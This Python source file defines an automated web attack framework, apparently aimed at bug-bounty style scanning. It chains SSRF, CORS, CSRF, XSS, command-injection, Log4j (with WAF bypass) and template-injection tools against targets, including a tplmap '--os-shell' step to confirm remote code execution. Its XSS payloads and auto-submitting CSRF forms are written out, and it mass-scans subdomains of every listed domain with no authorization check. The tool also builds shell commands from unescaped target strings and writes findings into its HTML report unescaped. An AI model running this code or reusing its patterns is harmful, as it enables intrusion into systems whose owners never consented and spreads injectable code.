import asyncio
import os
import json
import re
from typing import List, Dict, Any, Optional, Set
from pathlib import Path
import logging
import aiohttp
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin
import subprocess
import tempfile
import xml.etree.ElementTree as ET

class WebAttackModule:
    def __init__(self, output_dir: str = "results/web_attacks"):
        """
        Initialize the Web Attack Module
        
        Args:
            output_dir: Directory to store attack results
        """
        self.output_dir = Path(output_dir)
        self.logger = logging.getLogger("WebAttackModule")
        
        # Create output directories for each attack type
        self.ssrf_output = self.output_dir / "ssrf"
        self.cors_output = self.output_dir / "cors"
        self.csrf_output = self.output_dir / "csrf"
        self.xss_output = self.output_dir / "xss"
        self.cmdi_output = self.output_dir / "command_injection"
        self.redirect_output = self.output_dir / "open_redirect"
        self.ssti_output = self.output_dir / "ssti"
        
        for directory in [self.ssrf_output, self.cors_output, self.csrf_output,
                         self.xss_output, self.cmdi_output, self.redirect_output,
                         self.ssti_output]:
            os.makedirs(directory, exist_ok=True)

    async def setup_burp_collaborator(self) -> Optional[str]:
        """Setup Burp Collaborator client and get callback URL"""
        try:
            # Initialize Burp Collaborator client
            cmd = [
                "java", "-jar", "burp-collaborator-client.jar",
                "--startup"
            ]
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            # Extract collaborator URL from output
            match = re.search(r'http[s]?://[\w.-]+', stdout.decode())
            if match:
                return match.group(0)
        except Exception as e:
            self.logger.error(f"Error setting up Burp Collaborator: {str(e)}")
        return None

    async def run_ssrfmap(self, target: str, params: List[str]) -> Dict[str, Any]:
        """
        Run SSRFMap for SSRF detection
        
        Args:
            target: Target URL
            params: List of parameters to test
        """
        results = {"target": target, "findings": []}
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.ssrf_output / f"{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        try:
            # Get Burp Collaborator URL
            collaborator_url = await self.setup_burp_collaborator()
            
            for param in params:
                # Run SSRFMap with different payloads
                cmd = [
                    "python3", "SSRFmap/ssrfmap.py",
                    "-u", target,
                    "-p", param,
                    "--lhost", collaborator_url or "example.com",
                    "--verbose",
                    "--json"
                ]
                
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await process.communicate()
                
                try:
                    finding = json.loads(stdout.decode())
                    if finding.get("vulnerable"):
                        results["findings"].append({
                            "parameter": param,
                            "details": finding
                        })
                except json.JSONDecodeError:
                    pass
            
            # Save results
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
        except Exception as e:
            self.logger.error(f"Error running SSRFMap on {target}: {str(e)}")
        
        return results

    async def run_corsscanner(self, target: str) -> Dict[str, Any]:
        """
        Run CORSscanner for CORS misconfiguration detection
        
        Args:
            target: Target URL
        """
        results = {"target": target, "findings": []}
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.cors_output / f"{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        try:
            # Run CORSscanner
            cmd = [
                "python3", "CORSscanner/cors_scan.py",
                "-u", target,
                "-t", "10",
                "--headers", "Origin: https://evil.com",
                "--json"
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            try:
                findings = json.loads(stdout.decode())
                results["findings"] = findings
            except json.JSONDecodeError:
                pass
            
            # Additional CORS testing with Corsy
            cmd = [
                "python3", "Corsy/corsy.py",
                "-u", target,
                "--json"
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            try:
                corsy_findings = json.loads(stdout.decode())
                results["corsy_findings"] = corsy_findings
            except json.JSONDecodeError:
                pass
            
            # Save results
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
        except Exception as e:
            self.logger.error(f"Error running CORS scanners on {target}: {str(e)}")
        
        return results

    async def run_csrf_scan(self, target: str) -> Dict[str, Any]:
        """
        Run CSRF vulnerability detection
        
        Args:
            target: Target URL
        """
        results = {"target": target, "findings": []}
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.csrf_output / f"{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        try:
            # Run Blazy CSRF Scanner
            cmd = [
                "python3", "Blazy/blazy.py",
                "-u", target,
                "--csrf",
                "--json"
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            try:
                blazy_findings = json.loads(stdout.decode())
                results["blazy_findings"] = blazy_findings
            except json.JSONDecodeError:
                pass
            
            # Run Bolt CSRF Scanner
            cmd = [
                "python3", "Bolt/bolt.py",
                "-u", target,
                "--csrf-scan",
                "--json"
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            try:
                bolt_findings = json.loads(stdout.decode())
                results["bolt_findings"] = bolt_findings
            except json.JSONDecodeError:
                pass
            
            # Generate CSRF PoCs
            if any([results.get("blazy_findings"), results.get("bolt_findings")]):
                poc_dir = self.csrf_output / "poc"
                os.makedirs(poc_dir, exist_ok=True)
                
                for finding in results.get("blazy_findings", []) + results.get("bolt_findings", []):
                    if finding.get("form_action"):
                        poc_file = poc_dir / f"csrf_poc_{urlparse(finding['form_action']).path.replace('/', '_')}.html"
                        with open(poc_file, 'w') as f:
                            f.write(self._generate_csrf_poc(finding))
            
            # Save results
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
        except Exception as e:
            self.logger.error(f"Error running CSRF scan on {target}: {str(e)}")
        
        return results

    def _generate_csrf_poc(self, finding: Dict[str, Any]) -> str:
        """Generate CSRF PoC HTML file"""
        form_action = finding.get("form_action", "")
        method = finding.get("method", "POST")
        params = finding.get("parameters", {})
        
        html = f"""
        <html>
        <body>
        <h3>CSRF PoC</h3>
        <form action="{form_action}" method="{method}" id="csrf-form">
        """
        
        for name, value in params.items():
            html += f'    <input type="hidden" name="{name}" value="{value}">\n'
        
        html += """
        </form>
        <script>document.getElementById("csrf-form").submit();</script>
        </body>
        </html>
        """
        
        return html

    async def run_xss_scan(self, target: str) -> Dict[str, Any]:
        """
        Run XSS vulnerability detection with multiple tools
        
        Args:
            target: Target URL
        """
        results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "findings": [],
            "tool_results": {}
        }
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.xss_output / f"{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        try:
            # Create temporary files for storing intermediate results
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as urls_file:
                urls_temp = urls_file.name
            
            # 1. Run waybackurls and urldedupe to gather URLs
            cmd = f"waybackurls {target} | urldedupe -qs > {urls_temp}"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await process.communicate()
            
            # 2. Run hakrawler for additional URL discovery
            cmd = f"echo {target} | httpx -silent | hakrawler -subs | grep '=' >> {urls_temp}"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await process.communicate()
            
            # 3. Run airixss scan
            cmd = f"cat {urls_temp} | bhedak '\"><svg onload=confirm(1)>' | airixss -payload 'confirm(1)'"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            try:
                airixss_output = stdout.decode()
                if airixss_output.strip():
                    results["tool_results"]["airixss"] = {
                        "findings": airixss_output.splitlines(),
                        "timestamp": datetime.now().isoformat()
                    }
                    # Add to main findings if vulnerabilities found
                    for finding in airixss_output.splitlines():
                        if finding.strip():
                            results["findings"].append({
                                "tool": "airixss",
                                "url": finding,
                                "severity": "high",
                                "title": "Reflected XSS Detected",
                                "details": "Airixss detected a potential XSS vulnerability"
                            })
            except Exception as e:
                self.logger.error(f"Error parsing airixss output: {str(e)}")
            
            # 4. Run freq scan
            cmd = f"cat {urls_temp} | gf xss | uro | qsreplace '\"><img src=x onerror=alert(1);>' | freq"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            try:
                freq_output = stdout.decode()
                if freq_output.strip():
                    results["tool_results"]["freq"] = {
                        "findings": freq_output.splitlines(),
                        "timestamp": datetime.now().isoformat()
                    }
                    # Add frequency analysis results
                    for finding in freq_output.splitlines():
                        if finding.strip() and "potential XSS" in finding.lower():
                            results["findings"].append({
                                "tool": "freq",
                                "details": finding,
                                "severity": "medium",
                                "title": "Potential XSS Parameter Identified"
                            })
            except Exception as e:
                self.logger.error(f"Error parsing freq output: {str(e)}")
            
            # 5. Run bhedak with multiple payloads
            payloads = [
                '\"><svg/onload=alert(1)>*',
                '\'"><img src=x onerror=alert(1)>',
                '*/alert(1)/*',
                '{{7*7}}',
                '"autofocus/onfocus=alert(1)//'
            ]
            
            for payload in payloads:
                cmd = f"cat {urls_temp} | bhedak '{payload}'"
                process = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await process.communicate()
                
                try:
                    bhedak_output = stdout.decode()
                    if bhedak_output.strip():
                        if "bhedak" not in results["tool_results"]:
                            results["tool_results"]["bhedak"] = {
                                "findings": [],
                                "timestamp": datetime.now().isoformat()
                            }
                        results["tool_results"]["bhedak"]["findings"].extend(bhedak_output.splitlines())
                        
                        # Add to main findings if potential XSS found
                        for finding in bhedak_output.splitlines():
                            if finding.strip() and any(xss_indicator in finding.lower() for xss_indicator in ['<', '>', 'script', 'onerror', 'onload']):
                                results["findings"].append({
                                    "tool": "bhedak",
                                    "url": finding,
                                    "payload": payload,
                                    "severity": "high",
                                    "title": "XSS Vector Identified",
                                    "details": f"Bhedak identified a potential XSS point with payload: {payload}"
                                })
                except Exception as e:
                    self.logger.error(f"Error parsing bhedak output for payload {payload}: {str(e)}")
            
            # 6. Run XSStrike (existing implementation)
            cmd = [
                "python3", "XSStrike/xsstrike.py",
                "-u", target,
                "--json"
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            try:
                xsstrike_findings = json.loads(stdout.decode())
                results["tool_results"]["xsstrike"] = xsstrike_findings
            except json.JSONDecodeError:
                pass
            
            # Save all results
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            # Cleanup temporary files
            os.unlink(urls_temp)
            
        except Exception as e:
            self.logger.error(f"Error running XSS scan on {target}: {str(e)}")
        
        return results

    async def run_command_injection(self, target: str, params: List[str]) -> Dict[str, Any]:
        """
        Run Command Injection detection using Commix
        
        Args:
            target: Target URL
            params: List of parameters to test
        """
        results = {"target": target, "findings": []}
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.cmdi_output / f"{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        try:
            # Run Commix
            for param in params:
                cmd = [
                    "python3", "commix/commix.py",
                    "-u", target,
                    "-p", param,
                    "--batch",
                    "--output-dir", str(self.cmdi_output / timestamp),
                    "--format", "json"
                ]
                
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await process.communicate()
                
                try:
                    finding = json.loads(stdout.decode())
                    if finding.get("vulnerable"):
                        results["findings"].append({
                            "parameter": param,
                            "details": finding
                        })
                except json.JSONDecodeError:
                    pass
            
            # Run Gf pattern matching for potential command injection endpoints
            cmd = [
                "gf", "command-injection",
                "-f", target
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            results["potential_endpoints"] = stdout.decode().splitlines()
            
            # Save results
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
        except Exception as e:
            self.logger.error(f"Error running Command Injection scan on {target}: {str(e)}")
        
        return results

    async def run_open_redirect(self, target: str) -> Dict[str, Any]:
        """
        Run Open Redirect vulnerability detection
        
        Args:
            target: Target URL
        """
        results = {"target": target, "findings": []}
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.redirect_output / f"{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        try:
            # Run Open Redirect Scanner
            cmd = [
                "python3", "open-redirect-scanner/scanner.py",
                "-u", target,
                "--json"
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            try:
                scanner_findings = json.loads(stdout.decode())
                results["scanner_findings"] = scanner_findings
            except json.JSONDecodeError:
                pass
            
            # Run Gf pattern matching for potential open redirect endpoints
            cmd = [
                "gf", "redirect",
                "-f", target
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            results["potential_endpoints"] = stdout.decode().splitlines()
            
            # Save results
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
        except Exception as e:
            self.logger.error(f"Error running Open Redirect scan on {target}: {str(e)}")
        
        return results

    async def run_log4j_scan(self, target: str, endpoints: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Run Log4j vulnerability scan using log4j-scan
        
        Args:
            target: Target URL
            endpoints: Optional list of endpoints to test
        """
        results = {"target": target, "findings": [], "endpoint_findings": []}
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log4j_output = self.output_dir / "log4j"
        self.log4j_output.mkdir(exist_ok=True)
        output_file = self.log4j_output / f"{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        try:
            # Run log4j-scan on main target
            cmd = [
                "python3", "log4j-scan/log4j-scan.py",
                "-u", target,
                "--run-all-tests",
                "--waf-bypass",
                "--dns-callback-provider", "interact.sh"
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            try:
                scan_output = stdout.decode()
                if "Vulnerability Detected" in scan_output:
                    results["findings"].append({
                        "status": "vulnerable",
                        "details": scan_output,
                        "severity": "critical"
                    })
                else:
                    results["findings"].append({
                        "status": "not_vulnerable",
                        "details": scan_output
                    })
            except Exception as e:
                self.logger.error(f"Error parsing log4j-scan output: {str(e)}")

            # If endpoints are provided, scan each endpoint
            if endpoints:
                base_url = target.rstrip('/')
                for endpoint in endpoints:
                    endpoint = endpoint.lstrip('/')
                    endpoint_url = f"{base_url}/{endpoint}"
                    
                    cmd = [
                        "python3", "log4j-scan/log4j-scan.py",
                        "-u", endpoint_url,
                        "--run-all-tests",
                        "--waf-bypass",
                        "--dns-callback-provider", "interact.sh"
                    ]
                    
                    process = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    stdout, stderr = await process.communicate()
                    
                    try:
                        scan_output = stdout.decode()
                        finding = {
                            "endpoint": endpoint_url,
                            "status": "vulnerable" if "Vulnerability Detected" in scan_output else "not_vulnerable",
                            "details": scan_output,
                            "severity": "critical" if "Vulnerability Detected" in scan_output else "info"
                        }
                        results["endpoint_findings"].append(finding)
                    except Exception as e:
                        self.logger.error(f"Error scanning endpoint {endpoint_url}: {str(e)}")
            
            # Save results
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
        except Exception as e:
            self.logger.error(f"Error running Log4j scan on {target}: {str(e)}")
        
        return results

    async def run_subdomain_log4j_scan(self, domain: str, endpoints_file: Optional[str] = None) -> Dict[str, Any]:
        """
        Run Log4j scan on all subdomains of a domain
        
        Args:
            domain: Root domain to scan
            endpoints_file: Optional file containing endpoints to test
        """
        results = {
            "domain": domain,
            "timestamp": datetime.now().isoformat(),
            "subdomain_scans": []
        }
        
        try:
            # First, enumerate subdomains using various tools
            subdomains = set()
            
            # Use Subfinder
            cmd = f"subfinder -d {domain} -silent"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            subdomains.update(stdout.decode().splitlines())
            
            # Use Amass
            cmd = f"amass enum -passive -d {domain} -silent"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            subdomains.update(stdout.decode().splitlines())
            
            # Filter live subdomains with httpx
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write('\n'.join(subdomains))
                temp_file = f.name
            
            cmd = f"cat {temp_file} | httpx -silent -mc 200,403,401,500"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            live_subdomains = stdout.decode().splitlines()
            
            # Load endpoints if file is provided
            endpoints = []
            if endpoints_file and os.path.exists(endpoints_file):
                with open(endpoints_file) as f:
                    endpoints = [line.strip() for line in f if line.strip()]
            
            # Scan each live subdomain
            for subdomain in live_subdomains:
                scan_result = await self.run_log4j_scan(subdomain.strip(), endpoints)
                results["subdomain_scans"].append(scan_result)
            
            # Save comprehensive results
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"{domain}_subdomains_log4j_scan_{timestamp}.json"
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            # Cleanup temporary file
            os.unlink(temp_file)
            
        except Exception as e:
            self.logger.error(f"Error running subdomain Log4j scan on {domain}: {str(e)}")
        
        return results

    async def run_bbrf_log4j_scan(self, endpoints_file: Optional[str] = None) -> Dict[str, Any]:
        """
        Run Log4j scan on all domains from BBRF
        
        Args:
            endpoints_file: Optional file containing endpoints to test
        """
        results = {
            "timestamp": datetime.now().isoformat(),
            "scans": []
        }
        
        try:
            # Get domains from BBRF and filter with httpx
            cmd = "bbrf domains | httpx -silent"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            # Load endpoints if file is provided
            endpoints = []
            if endpoints_file and os.path.exists(endpoints_file):
                with open(endpoints_file) as f:
                    endpoints = [line.strip() for line in f if line.strip()]
            
            # Process each domain
            domains = stdout.decode().splitlines()
            for domain in domains:
                if domain.strip():
                    # For each domain, also scan its subdomains
                    scan_result = await self.run_subdomain_log4j_scan(domain.strip(), endpoints_file)
                    results["scans"].append(scan_result)
            
            # Save comprehensive results
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"bbrf_log4j_scan_{timestamp}.json"
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
        except Exception as e:
            self.logger.error(f"Error running BBRF Log4j scan: {str(e)}")
        
        return results

    async def run_ssti_scan(self, target: str, params: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Run SSTI (Server-Side Template Injection) detection using Tplmap
        
        Args:
            target: Target URL
            params: Optional list of parameters to test
        """
        results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "findings": []
        }
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.ssti_output / f"{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        try:
            # If no params provided, test the URL directly
            test_urls = [target]
            
            # If params are provided, create test URLs for each parameter
            if params:
                parsed_url = urlparse(target)
                query_params = parse_qs(parsed_url.query)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                
                for param in params:
                    # Create test URL with the parameter
                    test_url = f"{base_url}?{param}={{7*7}}"
                    if query_params:
                        # Add existing parameters
                        for key, values in query_params.items():
                            if key != param:
                                test_url += f"&{key}={values[0]}"
                    test_urls.append(test_url)
            
            # Test each URL with Tplmap
            for test_url in test_urls:
                # Run Tplmap with various test payloads
                cmd = [
                    "python3", "tplmap/tplmap.py",
                    "-u", test_url,
                    "--level", "5",  # Maximum detection level
                    "--output", str(self.ssti_output / f"tplmap_{timestamp}.txt"),
                    "--json"
                ]
                
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await process.communicate()
                
                try:
                    scan_output = stdout.decode()
                    if "Tplmap identified the following injection point" in scan_output:
                        # Extract template engine and vulnerability details
                        engine_match = re.search(r"Template engine: (\w+)", scan_output)
                        engine = engine_match.group(1) if engine_match else "Unknown"
                        
                        results["findings"].append({
                            "url": test_url,
                            "status": "vulnerable",
                            "template_engine": engine,
                            "details": scan_output,
                            "severity": "critical"
                        })
                        
                        # Run additional tests for RCE capabilities
                        cmd = [
                            "python3", "tplmap/tplmap.py",
                            "-u", test_url,
                            "--os-shell",
                            "--json"
                        ]
                        
                        process = await asyncio.create_subprocess_exec(
                            *cmd,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE
                        )
                        stdout, stderr = await process.communicate()
                        
                        if "OS command execution" in stdout.decode():
                            results["findings"][-1]["rce_capable"] = True
                    else:
                        results["findings"].append({
                            "url": test_url,
                            "status": "not_vulnerable",
                            "details": scan_output
                        })
                except Exception as e:
                    self.logger.error(f"Error parsing Tplmap output for {test_url}: {str(e)}")
            
            # Save results
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
        except Exception as e:
            self.logger.error(f"Error running SSTI scan on {target}: {str(e)}")
        
        return results

    async def run_all_attacks(self, target: str, params: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Run all web attacks against a target
        
        Args:
            target: Target URL
            params: Optional list of parameters to test
        """
        if not params:
            params = []
        
        results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "attacks": {}
        }
        
        try:
            # Run all attacks concurrently
            ssrf_task = self.run_ssrfmap(target, params)
            cors_task = self.run_corsscanner(target)
            csrf_task = self.run_csrf_scan(target)
            xss_task = self.run_xss_scan(target)
            cmdi_task = self.run_command_injection(target, params)
            redirect_task = self.run_open_redirect(target)
            log4j_task = self.run_log4j_scan(target)
            ssti_task = self.run_ssti_scan(target, params)
            
            # Wait for all tasks to complete
            results["attacks"]["ssrf"] = await ssrf_task
            results["attacks"]["cors"] = await cors_task
            results["attacks"]["csrf"] = await csrf_task
            results["attacks"]["xss"] = await xss_task
            results["attacks"]["command_injection"] = await cmdi_task
            results["attacks"]["open_redirect"] = await redirect_task
            results["attacks"]["log4j"] = await log4j_task
            results["attacks"]["ssti"] = await ssti_task
            
            # Save comprehensive results
            output_file = self.output_dir / f"{target.replace('://', '_').replace('/', '_')}_all_attacks.json"
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            # Generate HTML report
            self._generate_html_report(results)
            
        except Exception as e:
            self.logger.error(f"Error running attacks on {target}: {str(e)}")
        
        return results

    def _generate_html_report(self, results: Dict[str, Any]) -> None:
        """Generate HTML report from attack results"""
        target = results["target"]
        timestamp = results["timestamp"]
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Web Attack Results - {target}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .vulnerability {{ margin: 20px 0; padding: 10px; border: 1px solid #ccc; }}
                .high {{ background-color: #ffebee; }}
                .medium {{ background-color: #fff3e0; }}
                .low {{ background-color: #f1f8e9; }}
            </style>
        </head>
        <body>
            <h1>Web Attack Results</h1>
            <p><strong>Target:</strong> {target}</p>
            <p><strong>Scan Date:</strong> {timestamp}</p>
        """
        
        for attack_type, attack_results in results["attacks"].items():
            html += f"<h2>{attack_type.upper()} Results</h2>"
            
            if "findings" in attack_results:
                for finding in attack_results["findings"]:
                    severity = finding.get("severity", "medium")
                    html += f"""
                    <div class="vulnerability {severity}">
                        <h3>{finding.get('title', 'Finding')}</h3>
                        <p><strong>Severity:</strong> {severity}</p>
                        <p><strong>Details:</strong> {finding.get('details', 'No details provided')}</p>
                    </div>
                    """
        
        html += """
        </body>
        </html>
        """
        
        report_file = self.output_dir / f"{target.replace('://', '_').replace('/', '_')}_report.html"
        with open(report_file, 'w') as f:
            f.write(html)

if __name__ == "__main__":
    # Example usage
    async def main():
        attack_module = WebAttackModule()
        target = "http://example.com"
        params = ["id", "url", "redirect"]
        results = await attack_module.run_all_attacks(target, params)
        print(json.dumps(results, indent=2))
    
    asyncio.run(main()) 